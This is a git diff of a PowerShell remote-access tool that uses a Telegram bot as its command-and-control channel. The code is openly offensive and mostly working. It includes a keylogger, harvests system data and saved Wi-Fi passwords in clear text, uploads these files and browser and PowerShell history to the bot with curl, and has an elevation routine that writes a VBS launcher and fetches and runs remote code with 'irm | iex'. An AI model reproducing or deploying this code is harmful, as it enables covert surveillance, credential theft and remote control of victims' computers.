@@ -15,6 +15,7 @@ SEE README FOR MORE INFO
 # Define User Variables
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token
 #-----------------------------------------------------------------------------------------------------------
+
 # Define Connection Variables
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
@@ -23,13 +24,9 @@ $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
 # Emoji characters
-$tick = [char]::ConvertFromUtf32(0x2705)
-$comp = [char]::ConvertFromUtf32(0x1F4BB)
-$closed = [char]::ConvertFromUtf32(0x274C)
-$waiting = [char]::ConvertFromUtf32(0x1F55C)
-$glass = [char]::ConvertFromUtf32(0x1F50D)
-$cmde = [char]::ConvertFromUtf32(0x1F517)
-$pause = [char]::ConvertFromUtf32(0x23F8)
+$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
+$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
+$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
 # remove pause files
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
@@ -50,16 +47,8 @@ $scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 # Message waiting for passphrase
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params 
-#----------------------------------------------- ACTION FUNCTIONS ----------------------------------------------
-
-Function Close{
-$contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
-$params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-rm -Path "$env:temp/tgc2.txt" -Force
-exit
-}
+#----------------------------------------------- ACTION FUNCTIONS ----------------------------------------------
 
 Function Options{
 $contents = "==============================================
@@ -123,6 +112,14 @@ Use 'Folder-Tree' command to show all files
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+}
+
+Function Close{
+$contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+rm -Path "$env:temp/tgc2.txt" -Force
+exit
 }
 
 Function Upload{
@@ -214,7 +211,7 @@ Remove-Item -Path $filePath
 Function Key-Capture {
 $contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
@@ -272,7 +269,7 @@ Function System-Info{
 $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
 $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.DefaultIPGateway.length -gt 1}
 $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 $computerSystem = Get-CimInstance CIM_ComputerSystem
@@ -287,36 +284,29 @@ $Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSyste
 $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
-Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start()
-while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100}  
-$Geolocate.Position.Location | Select Latitude,Longitude
 $outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
 if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
 $pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
 $outpath = "$env:temp\SystemInfo.txt"
-"USER INFO `n =========================================================================" | Out-File -FilePath $outpath -Encoding ASCII
-"Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"USER INFO `n =========================================================================`n" | Out-File -FilePath $outpath -Encoding ASCII
+"$fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Location           : $Geolocate" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Saved Networks     : $outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Keyboard Layout    : $keyboardLayoutID`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
+"NETWORK INFO `n ======================================================================`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Public IP          : $computerPubIP`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"vvv  Saved Networks  vvv `n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($computerIP| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($network| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"HARDWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"computer           : $computerSystem" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"BIOS Info          : $computerBIOS" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"RAM Info           : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"HARDWARE INFO `n ======================================================================`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"BIOS Info          : $computerBIOS`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"vvv  RAM Info  vvv `nTotal RAM : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($computerRam| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($computerCpu| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
@@ -325,10 +315,8 @@ $outpath = "$env:temp\SystemInfo.txt"
 ($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-$FilePath = "$env:temp\SystemInfo.txt"
-curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-Remove-Item -Path $FilePath -Force
+curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+Remove-Item -Path $outpath -Force
 }
 
 
@@ -345,11 +333,8 @@ $outpath = "$env:temp\SoftwareInfo.txt"
 ($process| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($service| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Drivers            : $drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-$FilePath = "$env:temp\SoftwareInfo.txt"
-curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-Remove-Item -Path $FilePath -Force
+curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+Remove-Item -Path $outpath -Force
 }
 
 
@@ -370,41 +355,16 @@ $outpath = "$env:temp\History.txt"
 ($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-$FilePath = "$env:temp\History.txt"
-curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-Remove-Item -Path $FilePath -Force
+curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+Remove-Item -Path $outpath -Force
 }
 
-Function ShowButtons{
-$messagehead = "Press a Button to Continue..."
-$inlineKeyboardJson = '{"inline_keyboard":[[{"text": "Enter Commands","callback_data": "button_clicked"},{"text": "Options","callback_data": "button2_clicked"}]]}'
-$paramers = @{
-    chat_id = $chatId
-    text = $messagehead
-    reply_markup = $inlineKeyboardJson
-}
-Invoke-RestMethod -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
-$killint = 0
-$offset = 0
-while ($killint -eq 0) {
-    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
-    foreach ($update in $updates.result) {
-        $offset = $update.update_id + 1
-        Sleep 1
-        if ($update.callback_query.data -eq "button_clicked") {
-            $killint = 1
-        }
-        if ($update.callback_query.data -eq "button2_clicked") {
-            $killint = 1
-            Options
-        }
-    }
-    Sleep 1
-}
-$contents = "$comp $env:COMPUTERNAME $tick Session Started"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Function Enumerate-LAN{
+
+
+# Updating SOON!
+
+
 }
 
 Function Folder-Tree{
@@ -450,11 +410,8 @@ Write-Output "Uninstalled."
 Function Pause-Session{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 $script:AcceptedSession=""
-$contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
 Function Is-Admin{
@@ -474,13 +431,11 @@ Function Attempt-Elevate{
 $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-
 If Not WScript.Arguments.Named.Exists(`"elevate`") Then
   CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-
 WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex`", 0, True
 "@
 $pth = "C:\Windows\Tasks\service.vbs"
@@ -544,6 +499,33 @@ Function Enable-HID{
 
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
+Function ShowButtons{
+$messagehead = "Press a Button to Continue..."
+$inlineKeyboardJson = '{"inline_keyboard":[[{"text": "Enter Commands","callback_data": "button_clicked"},{"text": "Options","callback_data": "button2_clicked"}]]}'
+$paramers = @{chat_id = $chatId ;text = $messagehead ;reply_markup = $inlineKeyboardJson}
+Invoke-RestMethod -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
+$killint = 0
+$offset = 0
+while ($killint -eq 0) {
+    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
+    foreach ($update in $updates.result) {
+        $offset = $update.update_id + 1
+        Sleep 1
+        if ($update.callback_query.data -eq "button_clicked") {
+            $killint = 1
+        }
+        if ($update.callback_query.data -eq "button2_clicked") {
+            $killint = 1
+            Options
+        }
+    }
+    Sleep 1
+}
+$contents = "$comp $env:COMPUTERNAME $tick Session Started"
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+}
+
 Function IsAuth{ 
 param($CheckMessage)
     if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
@@ -561,11 +543,11 @@ param($Stream)
 $FixedResult=@()
 $Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "tgc2.txt") -Force
 $ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "tgc2.txt") | where {$_.length -gt 0}
-foreach ($line in $ReadAsArray){
+    foreach ($line in $ReadAsArray){
     $ArrObj=New-Object psobject
     $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
     $FixedResult +=$ArrObj
-}
+    }
 return $FixedResult
 }
 
